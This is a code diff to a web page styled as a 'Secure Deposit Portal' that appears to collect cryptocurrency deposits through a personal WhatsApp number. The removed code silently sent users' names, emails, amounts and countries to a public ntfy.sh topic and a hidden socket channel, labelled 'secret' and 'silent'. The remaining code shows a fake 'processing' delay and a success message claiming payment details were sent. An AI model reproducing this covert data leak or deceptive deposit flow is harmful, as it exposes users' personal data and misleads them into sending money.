@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head:
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>Supper Cash Premium | Secure Deposit Portal</title>
@@ -409,7 +409,7 @@
   </style>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script src="/socket.io/socket.io.js"></script>
+  <!-- No more external socket.io or ntfy dependencies -->
 </head>
 <body>
   <div class="toast-container" id="toastContainer"></div>
@@ -558,7 +558,7 @@
           </div>
           <div style="display: flex; gap: 12px; margin-top: 10px;">
             <i class="fab fa-whatsapp" style="color: #25D366;"></i>
-            <span style="font-size: 0.9rem;">Live Chat Available</span>
+            <span style="font-size: 0.9rem;">+1 256 821 2395</span>
           </div>
         </div>
       </div>
@@ -570,12 +570,10 @@
   </div>
 
   <script>
-    // ======================= SECURE NOTIFICATION SYSTEM =======================
-    const NTFY_TOPIC = "supper-cash-secure";
+    // ======================= WHATSAPP-BASED DEPOSIT SYSTEM =======================
     const ADMIN_WHATSAPP = "+12568212395";
     const MIN_DEPOSIT = 20;
     
-    let socket = null;
     let currentUser = { fullName: "Premium Member", email: "member@supper.cash", id: "USR001" };
     
     // DOM Elements
@@ -601,43 +599,7 @@
       setTimeout(() => toast.remove(), 4500);
     }
     
-    // ========== SECRET NTFY NOTIFICATION ==========
-    async function sendSecretNtfyAlert(depositData) {
-      try {
-        const messageText = `🔔 DEPOSIT REQUEST\n━━━━━━━━━━━━━━━━\n👤 User: ${depositData.fullName}\n📧 Email: ${depositData.email}\n💵 Amount: $${depositData.amountUSD} USD\n🌍 Country: ${depositData.country}\n💳 Method: ${depositData.method}\n🕒 Time: ${depositData.time}\n🆔 ID: ${depositData.id}\n━━━━━━━━━━━━━━━━\nStatus: PENDING CONFIRMATION`;
-        await fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
-          method: 'POST',
-          body: messageText,
-          headers: { 
-            'Title': '💰 New Deposit Alert',
-            'Priority': 'high',
-            'Tags': 'moneybag,alert,rocket'
-          }
-        });
-        console.log("✅ Silent ntfy notification delivered");
-      } catch (err) {
-        console.warn("ntfy silent mode:", err);
-      }
-    }
-    
-    // ========== SOCKET.IO ADMIN CHAT ==========
-    function initSecretSocket() {
-      if (typeof io !== 'undefined') {
-        socket = io();
-        socket.on('connect', () => console.log('🔌 Admin channel ready'));
-        socket.on('connect_error', () => console.log('Socket offline - silent mode'));
-      }
-    }
-    
-    async function notifyAdminChat(payload) {
-      if (socket && socket.connected) {
-        const msg = `🔔 NEW DEPOSIT\nUser: ${payload.fullName}\nEmail: ${payload.email}\nAmount: $${payload.amountUSD}\nMethod: ${payload.method}\nCountry: ${payload.country}`;
-        socket.emit('send-message', { to: 'admin@delux.com', message: msg });
-        console.log("Admin chat notified");
-      }
-    }
-    
-    // ========== WHATSAPP AUTO-REDIRECT ==========
+    // ========== WHATSAPP REDIRECT ==========
     function triggerWhatsAppWithDetails(details) {
       const waMsg = `*💰 DEPOSIT REQUEST*%0A%0A` +
         `*👤 User:* ${encodeURIComponent(details.fullName)}%0A` +
@@ -647,14 +609,14 @@
         `*💳 Method:* ${encodeURIComponent(details.method)}%0A` +
         `*🕒 Time:* ${encodeURIComponent(details.time)}%0A` +
         `*🆔 Reference:* ${details.ref}%0A%0A` +
-        `*📝 Message:* Please send me payment details as I requested. I wanted to deposit $${details.amountUSD} USD via ${details.method}.%0A%0A` +
+        `*📝 Message:* Please send me payment details for $${details.amountUSD} USD via ${details.method}.%0A%0A` +
         `✅ Awaiting payment instructions.`;
       
       const waUrl = `https://wa.me/${ADMIN_WHATSAPP.replace(/[^0-9]/g, '')}?text=${waMsg}`;
       window.open(waUrl, '_blank');
     }
     
-    // Load user data
+    // Load user data (keeping fetch for dynamic name, with fallback)
     async function loadUserData() {
       try {
         const response = await fetch('/user-info');
@@ -745,46 +707,26 @@
         id: currentUser.id
       };
       
-      try {
-        // Secret ntfy notification
-        await sendSecretNtfyAlert(depositPayload);
-        
-        // Admin chat notification
-        await notifyAdminChat(depositPayload);
-        
-        // Auto open WhatsApp with payment details request
-        triggerWhatsAppWithDetails(depositPayload);
-        
-        // Simulate processing
-        setTimeout(() => {
-          loadingOverlay.classList.remove('active');
-          showToast(`Deposit request submitted! Reference: ${reference}. Payment details sent via WhatsApp.`, 'success');
-          submitBtn.disabled = false;
-          
-          // Reset form
-          amountInput.value = '';
-          countrySelect.value = '';
-          paymentTypeSelect.value = 'Bitcoin (BTC)';
-          amountDisplay.style.display = 'none';
-          
-          // Optional redirect after delay
-          setTimeout(() => {
-            window.location.href = '/chat.html';
-          }, 2500);
-        }, 1800);
-        
-      } catch (error) {
-        console.error('Notification error:', error);
+      // Simulate brief processing, then open WhatsApp with deposit details
+      setTimeout(() => {
         loadingOverlay.classList.remove('active');
-        // Fallback - still try WhatsApp
-        triggerWhatsAppWithDetails(depositPayload);
-        showToast('Deposit request recorded. Admin will contact you shortly.', 'success');
+        showToast(`Deposit request submitted! Reference: ${reference}. Payment details sent via WhatsApp.`, 'success');
         submitBtn.disabled = false;
         
+        // Open WhatsApp with the pre-filled deposit details
+        triggerWhatsAppWithDetails(depositPayload);
+        
+        // Reset form
+        amountInput.value = '';
+        countrySelect.value = '';
+        paymentTypeSelect.value = 'Bitcoin (BTC)';
+        amountDisplay.style.display = 'none';
+        
+        // Optional redirect after delay
         setTimeout(() => {
           window.location.href = '/chat.html';
-        }, 2000);
-      }
+        }, 3000);
+      }, 1800);
     }
     
     // Event listeners
@@ -796,7 +738,6 @@
     // Initialize
     async function init() {
       await loadUserData();
-      initSecretSocket();
       setupEventListeners();
     }
     
